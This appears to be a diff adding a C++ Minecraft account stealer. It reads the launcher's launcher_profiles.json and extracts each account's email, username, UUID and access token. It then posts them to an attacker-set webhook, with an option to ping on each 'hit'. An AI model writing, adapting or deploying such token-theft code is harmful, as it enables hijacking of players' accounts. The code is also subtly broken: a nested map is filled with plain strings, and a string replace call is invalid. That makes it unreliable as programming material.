@@ -1,0 +1,116 @@
+#include <iostream>
+#include <fstream>
+#include <sstream>
+#include <string>
+#include <map>
+#include <vector>
+#include <cstring>
+#include <cstdlib>
+#include <curl/curl.h>
+#include <jsoncpp/json/json.h>
+
+// your webhook URL
+const std::string WEBHOOK_URL = "WEBHOOK HERE";
+
+// mentions you when you get a hit
+const bool PING_ME = false;
+
+std::string uuid_dashed(const std::string& uuid)
+{
+    return uuid.substr(0, 8) + "-" + uuid.substr(8, 4) + "-" + uuid.substr(12, 4) + "-" + uuid.substr(16, 4) + "-" + uuid.substr(20, 12);
+}
+
+int main()
+{
+    std::map<std::string, std::map<std::string, std::string>> auth_db;
+    std::stringstream ss;
+
+    // Read the file into a stringstream
+    std::ifstream file(std::string(getenv("APPDATA")) + "\\.minecraft\\launcher_profiles.json");
+    ss << file.rdbuf();
+    file.close();
+
+    // Parse the stringstream into a map
+    std::string line;
+    std::string key;
+    std::string value;
+    bool in_object = false;
+    while (std::getline(ss, line))
+    {
+        if (line.find('{') != std::string::npos)
+        {
+            in_object = true;
+        }
+        else if (line.find('}') != std::string::npos)
+        {
+            in_object = false;
+        }
+        else if (in_object)
+        {
+            size_t colon_pos = line.find(':');
+            if (colon_pos != std::string::npos)
+            {
+                key = line.substr(1, colon_pos - 3);
+                value = line.substr(colon_pos + 2, line.size() - colon_pos - 4);
+                auth_db[key] = value;
+            }
+        }
+    }
+
+    std::vector<Json::Value> embeds;
+
+    for (const auto& x : auth_db)
+    {
+        try
+        {
+            std::string email = x.second.at("username");
+            std::string uuid = x.first;
+            std::string display_name_object = x.second.at("displayName");
+            Json::Value embed;
+            Json::Value field1;
+            field1["name"] = "Email";
+            field1["value"] = (email.find('@') != std::string::npos) ? email : "N/A";
+            field1["inline"] = false;
+            Json::Value field2;
+            field2["name"] = "Username";
+            field2["value"] = display_name_object.replace("_", "\\_");
+            field2["inline"] = true;
+            Json::Value field3;
+            field3["name"] = "UUID";
+            field3["value"] = uuid_dashed(uuid);
+            field3["inline"] = true;
+            Json::Value field4;
+            field4["name"] = "Token";
+            field4["value"] = x.second.at("accessToken");
+            field4["inline"] = true;
+            embed["fields"].append(field1);
+            embed["fields"].append(field2);
+            embed["fields"].append(field3);
+            embed["fields"].append(field4);
+            embeds.push_back(embed);
+        }
+        catch (const std::out_of_range&)
+        {
+        }
+    }
+
+    Json::Value payload;
+    payload["embeds"] = embeds;
+    payload["content"] = (PING_ME) ? "@everyone" : "";
+
+    CURL* curl = curl_easy_init();
+    if (curl)
+    {
+        struct curl_slist* headers = NULL;
+        headers = curl_slist_append(headers, "Content-Type: application/json");
+        headers = curl_slist_append(headers, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11");
+        curl_easy_setopt(curl, CURLOPT_URL, WEBHOOK_URL.c_str());
+        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, payload.toStyledString().c_str());
+        curl_easy_perform(curl);
+        curl_slist_free_all(headers);
+        curl_easy_cleanup(curl);
+    }
+
+    return 0;
+}
